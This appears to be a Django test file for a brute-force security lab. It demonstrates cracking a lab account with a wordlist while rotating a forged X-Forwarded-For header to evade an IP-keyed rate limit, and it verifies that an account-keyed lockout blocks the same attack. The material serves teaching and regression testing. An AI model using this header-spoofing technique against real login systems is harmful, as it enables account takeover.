"""Runnable proof that the IP-keyed limit is bypassed by rotating the forged
X-Forwarded-For header (so the wordlist cracks the account and the flag leaks),
that the per-account lockout survives that same rotation, and that a correct
password still logs in.

Postgres is the only supported backend, locally and in CI:

    docker compose run --rm web python manage.py test labs.post_11_brute_force

The cache is cleared around each test — the throttle counters live in
`LocMemCache`, which persists across tests within a process otherwise (see
_throttle.py). `test_lockout_survives_source_rotation` is the one that matters:
it fails on any IP-keyed configuration.
"""

from django.contrib.auth.models import User
from django.core.cache import cache
from django.test import Client, TestCase

from .models import Note
from .seed import FLAG, VICTIM_PASSWORD, WORDLIST


class BruteForceLabTests(TestCase):
    def setUp(self):
        cache.clear()
        self.victim = User.objects.create_user("victim", password=VICTIM_PASSWORD)
        Note.objects.create(owner=self.victim, body=f"private: {FLAG}")
        self.client = Client()

    def tearDown(self):
        cache.clear()

    def test_exploit_succeeds_on_vulnerable_view(self):
        # Rotate the forged X-Forwarded-For so the IP-keyed limit never triggers;
        # the wordlist runs to the end and the correct password logs us in.
        cracked = False
        for i, pw in enumerate(WORDLIST):
            resp = self.client.post(
                "/brute-force/vulnerable/login/",
                {"username": "victim", "password": pw},
                HTTP_X_FORWARDED_FOR=f"10.0.0.{i}",
            )
            if resp.status_code == 200:
                cracked = True
                break
        self.assertTrue(cracked)
        # Now authenticated as the victim — the private note hands over the flag.
        html = self.client.get("/brute-force/note/").content.decode()
        self.assertIn(FLAG, html)

    def test_lockout_survives_source_rotation(self):
        # The regression that matters: the same rotated attack, but the secure
        # login keys on the ACCOUNT, so rotating the source cannot dodge it.
        statuses = []
        for i, pw in enumerate(WORDLIST):
            resp = self.client.post(
                "/brute-force/secure/login/",
                {"username": "victim", "password": pw},
                HTTP_X_FORWARDED_FOR=f"10.0.0.{i}",
            )
            statuses.append(resp.status_code)
        self.assertIn(403, statuses)          # the account locked
        self.assertNotIn(200, statuses)       # the password was never reached
        # And the flag stays out of reach (never authenticated).
        self.assertNotEqual(self.client.get("/brute-force/note/").status_code, 200)

    def test_correct_password_first_try_succeeds_on_secure_view(self):
        # The lockout counts failures; a correct password on an un-locked account
        # still works, so legitimate users are not punished.
        resp = self.client.post(
            "/brute-force/secure/login/",
            {"username": "victim", "password": VICTIM_PASSWORD},
        )
        self.assertEqual(resp.status_code, 200)
